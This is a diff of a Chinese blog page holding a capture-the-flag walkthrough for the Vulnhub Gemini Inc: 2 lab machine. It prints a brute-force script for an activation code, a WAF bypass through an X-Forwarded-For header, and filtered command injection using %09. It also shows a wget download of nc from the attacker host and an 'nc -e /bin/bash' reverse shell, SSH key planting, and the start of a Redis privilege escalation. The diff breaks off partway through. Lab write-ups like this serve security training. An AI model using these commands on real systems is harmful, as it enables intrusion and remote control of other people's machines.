@@ -13,32 +13,6 @@
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
 <meta property="og:description" content="该靶机难度中等，涉及redis相关漏洞。由于WAF的存在，感觉比较贴近现实。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211550.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211635.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212047.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212349.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212529.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212732.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213421.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213554.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213734.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213821.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214056.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214121.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214312.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214535.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214637.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215436.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215535.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215719.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215817.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215850.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220155.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220211.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220352.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503221607.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503222619.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503223106.png">
 <meta property="article:published_time" content="2022-05-02T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-05-03T15:07:26.999Z">
 <meta property="article:author" content="hdfzzf">
@@ -49,7 +23,6 @@
 <meta property="article:tag" content="隐藏路径爬取">
 <meta property="article:tag" content="redis漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211550.png">
     
     
       
@@ -119,7 +92,7 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="上一篇" href="/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="下一篇" href="/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -132,7 +105,8 @@
     </span>
     <br/>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1. 方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2. 方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1. 番外</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1.
+主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1. 方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2. 方法2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1. 番外</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -186,7 +160,8 @@
 <h1 id="靶机信息">1. 靶机信息</h1>
 <p>靶机地址：</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/gemini-inc-2,234/">Gemini Inc: 2 ~ VulnHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/gemini-inc-2,234/">Gemini
+Inc: 2 ~ VulnHub</a></li>
 </ul>
 <p>难度：</p>
 <ul>
@@ -213,25 +188,36 @@
 <li>Redis漏洞利用</li>
 </ul>
 <h1 id="渗透">2. 渗透</h1>
-<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
+<h2 id="主机发现端口扫描端口服务发现">2.1.
+主机发现、端口扫描、端口服务发现</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.21</span><br><span class="line">sudo nmap -p22,80 -A 192.168.100.21</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211550.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211550.png" /></p>
 <p>可以得到的信息很常规。</p>
 <h2 id="访问http服务">2.2. 访问http服务</h2>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211635.png" /></p>
-<p>与1不同的是，这里多了一个登录功能，尝试1的账号和密码，发现无法登录。除了这个之外，User List点进去是空白的页面，然后就没有其他的了。</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503211635.png" /></p>
+<p>与1不同的是，这里多了一个登录功能，尝试1的账号和密码，发现无法登录。除了这个之外，User
+List点进去是空白的页面，然后就没有其他的了。</p>
 <p>接下来路径发现： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.100.21/</span><br></pre></td></tr></table></figure></p>
-<p>然后对扫描到的路径一一检查，并没有发现有用的信息。（默默bb一句：dirsearch每次都扫不出关键的，因此强烈建议配合dirb和gobuster使用）隐藏路径爬取：（二选一） <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. dirb http://192.168.100.21 -X .php</span><br><span class="line">2. gobuster dir -u http://192.168.100.21/ -w /usr/share/dirb/wordlists/common.txt -x php,html,txt</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212047.png" /></p>
+<p>然后对扫描到的路径一一检查，并没有发现有用的信息。（默默bb一句：dirsearch每次都扫不出关键的，因此强烈建议配合dirb和gobuster使用）隐藏路径爬取：（二选一）
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. dirb http://192.168.100.21 -X .php</span><br><span class="line">2. gobuster dir -u http://192.168.100.21/ -w /usr/share/dirb/wordlists/common.txt -x php,html,txt</span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212047.png" /></p>
 <p>得到两个新的文件。前者目前还看不懂什么作用，不过从名字来看应该是激活用户的。而后者就是注册新用户的，因此先注册一个用户</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212349.png" /></p>
-<p>点击hack -&gt; My Profile之后url上回显示出u=17，猜测这是我们新用户的id。</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212349.png" /></p>
+<p>点击hack -&gt; My
+Profile之后url上回显示出u=17，猜测这是我们新用户的id。</p>
 <p>用户需要激活，激活的code是一个6位的纯数字，联想到activate.php，应该就是利用该文件进行激活，code我们并不知道，因此需要爆破。</p>
 <p>不过查看activate.php源码发现有一个隐藏的表单</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212529.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212529.png" /></p>
 <p>并且每次刷新都不同。随便填入一个code然后抓包发现</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212732.png" /></p>
-<p>会发现这里提交的token和源码中隐藏的token是一样的，并且多尝试提交几次，每次都是如此。合理怀疑这是CSRF token。这是需要注意的一个点。</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503212732.png" /></p>
+<p>会发现这里提交的token和源码中隐藏的token是一样的，并且多尝试提交几次，每次都是如此。合理怀疑这是CSRF
+token。这是需要注意的一个点。</p>
 <h3 id="方法1">2.2.1. 方法1</h3>
 <p>在网上找到别人写的一个脚本： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">url=<span class="string">&quot;http://192.168.100.21/activate.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> &#123;000000..999999&#125;; <span class="keyword">do</span></span><br><span class="line">    token=$(curl -s -c cookie <span class="variable">$url</span> | awk -F <span class="string">&#x27;value=&#x27;</span> <span class="string">&#x27;/token/ &#123;print $2&#125;&#x27;</span> | cut -d <span class="string">&quot;&#x27;&quot;</span> -f2)</span><br><span class="line">    resp=$(curl -s -w %&#123;http_code&#125; -b cookie --data <span class="string">&quot;userid=14&amp;activation_code=<span class="variable">$key</span>&amp;token=<span class="variable">$&#123;token&#125;</span>&quot;</span> <span class="variable">$url</span> | tail -n 1 | cut -d <span class="string">&quot;&gt;&quot;</span> -f2)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$resp</span> -ne 403 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Key = &quot;</span><span class="variable">$key</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
 <p>修改靶机的ip，然后执行，等待一段时间后 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀hdfzzf)-[~]</span><br><span class="line">└─<span class="comment"># ./geminiinc2.sh                                                                                   </span></span><br><span class="line">Key = 000511</span><br></pre></td></tr></table></figure></p>
@@ -240,16 +226,23 @@
 <p>利用burp爆破，不过有点麻烦，需要设置许多东西。</p>
 <ol type="1">
 <li><p>将 Attack Type 设置成 Pitchfork</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213421.png" /></p></li>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213421.png" /></p></li>
 <li><p>设置第一个参数为numbers，并且整数部分的最大、最小长度都设置为6，因为必须是6为的数字</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213554.png" /></p></li>
-<li><p>设置第二个参数为，然后来到Options -&gt; Grep-Payload -&gt; add（只需要选中即可，burp会自动识别开始地方和结束地方）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213734.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213821.png" /></p></li>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213554.png" /></p></li>
+<li><p>设置第二个参数为，然后来到Options -&gt; Grep-Payload -&gt;
+add（只需要选中即可，burp会自动识别开始地方和结束地方）</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213734.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503213821.png" /></p></li>
 <li><p>Resource Pool中线程设置为1</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214056.png" /></p></li>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214056.png" /></p></li>
 <li><p>Options中的错误重试设置为0</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214121.png" /></p></li>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214121.png" /></p></li>
 </ol>
 <p>注意：</p>
 <ol type="1">
@@ -258,36 +251,53 @@
 <li>最好用pro版本，会快一点</li>
 </ol>
 <p>我做演示就不从0开始了</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214312.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214312.png" /></p>
 <p>可以看到payload为000511的时候，状态码为302，并且下一个payload没有token了，这是因为000511是对的，此时被重定向到根目录了，所以不会再次产生token。</p>
 <h2 id="get-shell">2.3. get shell</h2>
-<p>进去之后，首先尝试了一下1的漏洞还在不在，发现不在了。接下来进行信息收集，只有一个User List</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214535.png" /></p>
+<p>进去之后，首先尝试了一下1的漏洞还在不在，发现不在了。接下来进行信息收集，只有一个User
+List</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214535.png" /></p>
 <p>经过一定时间观察，只有黄色名字的用户是administrator，其他都是member，并且个人账户的页面源码中会有password的注释</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214637.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503214637.png" /></p>
 <p>查看了自己新建立的用户，并且自己的密码sha1加密之后的值和其一样，因此合理推测，administrator源码中的密码就是管理员的登录密码。找一个在线解密的平台解密得到密码为：secretpassword</p>
 <p>然后直接登录。需要注意username和display name！</p>
 <p>进入到管理员的后台之后，发现多了两个功能</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215436.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215436.png" /></p>
 <p>其中命令执行让我打起了精神，但是直接访问是空白，我们抓包看一下发生了什么事</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215535.png" /></p>
-<p>注意到侠士 IP NOT ALLOW，也就是后台可能开启了WAF，因此需要加入 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1 </span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215535.png" /></p>
+<p>注意到侠士 IP NOT ALLOW，也就是后台可能开启了WAF，因此需要加入
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1 </span><br></pre></td></tr></table></figure></p>
 <p>也可以加入其他头部。因为每个包都需要加这个，直接使用burp设置一下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215719.png" /></p>
-<p>然后勾选上就可以了，这样子每个包burp就会自动添加上该头部。当然也可以用burp的插件，Bypass WAF，原理一样，自行搜索。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215817.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215719.png" /></p>
+<p>然后勾选上就可以了，这样子每个包burp就会自动添加上该头部。当然也可以用burp的插件，Bypass
+WAF，原理一样，自行搜索。</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215817.png" /></p>
 <p>发现确实显示出了东西。但是这里执行的命令不会回显，只会显示</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215850.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503215850.png" /></p>
 <p>并且，过滤了空格和cat（可能还有其他被过滤了，但是我比较关注这两个）空格其实比较好绕过，可以用%09代替，或者IFS。但是%09需要在burp里面修改，不能够直接在输入框里面，否则会再次被url编码，这里也推测出，后台还过滤了%。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220155.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220211.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220155.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220211.png" /></p>
 <p>那么可以直接通过这里执行nc，反弹shell即可。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220352.png" /></p>
-<p>发现靶机上没有nc，但是kali上有，可以通过靶机的命令执行，下载kali的nc然后反弹。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">1. <span class="built_in">cd</span> /usr/bin</span><br><span class="line">2. python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">1. wget%09http://192.168.100.10:80/nc%09-O%09/tmp/nc <span class="comment"># 将nc保存到/tmp下面</span></span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503220352.png" /></p>
+<p>发现靶机上没有nc，但是kali上有，可以通过靶机的命令执行，下载kali的nc然后反弹。
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">1. <span class="built_in">cd</span> /usr/bin</span><br><span class="line">2. python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">1. wget%09http://192.168.100.10:80/nc%09-O%09/tmp/nc <span class="comment"># 将nc保存到/tmp下面</span></span><br></pre></td></tr></table></figure></p>
 <p>然后执行： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod%09%2bx%09/tmp/nc</span><br><span class="line">/tmp/nc%09192.168.100.10%094444%09-e%09/bin/bash</span><br></pre></td></tr></table></figure></p>
 <p>注意：</p>
 <ol type="1">
-<li>chmod +x /tmp/nc的时候，如果直接在输入框输入，只需要修改空格为%09即可。因为自动会把+ url编码；如果在burp输入，需要把 + url编码，因为在burp中+就是空格；</li>
+<li>chmod +x
+/tmp/nc的时候，如果直接在输入框输入，只需要修改空格为%09即可。因为自动会把+
+url编码；如果在burp输入，需要把 + url编码，因为在burp中+就是空格；</li>
 </ol>
 <p>成功得到shell。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">gemini1@geminiinc:/var/www/html$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(gemini1) gid=1000(gemini1) groups=1000(gemini1),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br></pre></td></tr></table></figure>
@@ -297,18 +307,24 @@
 <p>也可以反弹shell。IFS=:的作用是将:全都转为空格。</p>
 <h2 id="权限提升">2.4. 权限提升</h2>
 <p>经过信息收集，发现没有suid、内核等常用的提权，但是在查看端口的时候发现开了6379端口，这是redis使用的端口，而redis又存在着许多漏洞。除此之外，还开起了3306，这是MySQL默认的端口。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503221607.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503221607.png" /></p>
 <p>这里需要注意现在获得的shell是不能够进行交互的，如果直接连接redis就会出不来，因此下面需要利用ssh登录获得完整的shell。但是我们不知道密码该怎么办呢？其实很简单，通过对端口服务的发现，可以猜测ssh可能可以ssh公钥认证登录。</p>
 <p>先在kali上生成公私钥 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure></p>
-<p>然后将公钥发送到靶机，并且保存为/home/gemini1/.ssh/authorized_keys <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">1. mkdir .ssh</span><br><span class="line">2. <span class="built_in">cd</span> .ssh</span><br><span class="line">3. /tmp/nc -lvnp 4444 &gt; authorized_keys</span><br><span class="line"></span><br><span class="line">kalil:</span><br><span class="line">1. nc 192.168.100.21 4444 &lt; id_rsa.pub -w 1</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">1. chmod 600 authorized_keys</span><br><span class="line"></span><br><span class="line">kali:</span><br><span class="line">1. ssh gemini1@192.168.100.21 -i id_rsa</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503222619.png" /></p>
+<p>然后将公钥发送到靶机，并且保存为/home/gemini1/.ssh/authorized_keys
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">1. mkdir .ssh</span><br><span class="line">2. <span class="built_in">cd</span> .ssh</span><br><span class="line">3. /tmp/nc -lvnp 4444 &gt; authorized_keys</span><br><span class="line"></span><br><span class="line">kalil:</span><br><span class="line">1. nc 192.168.100.21 4444 &lt; id_rsa.pub -w 1</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">1. chmod 600 authorized_keys</span><br><span class="line"></span><br><span class="line">kali:</span><br><span class="line">1. ssh gemini1@192.168.100.21 -i id_rsa</span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503222619.png" /></p>
 <p>我对redis的漏洞不熟，这里演示一下该漏洞的利用。</p>
 <p>首先查看redis的配置文件，默认在/etc/redis <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/redis/6379.conf</span><br></pre></td></tr></table></figure></p>
 <p>内容非常的多，要仔细看，发现了下面这段话</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503223106.png" /></p>
-<p>有一个requirepass: 8a7b86a2cd89d96dfcc125ebcc0535e6。接下来就一步一步操作。</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503223106.png" /></p>
+<p>有一个requirepass:
+8a7b86a2cd89d96dfcc125ebcc0535e6。接下来就一步一步操作。</p>
 <ol type="1">
-<li><p>将authorized_keys转为txt格式，也就是redis能够识别的格式 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat authorized_keys; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; pub.txt</span><br></pre></td></tr></table></figure></p></li>
+<li><p>将authorized_keys转为txt格式，也就是redis能够识别的格式
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat authorized_keys; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; pub.txt</span><br></pre></td></tr></table></figure></p></li>
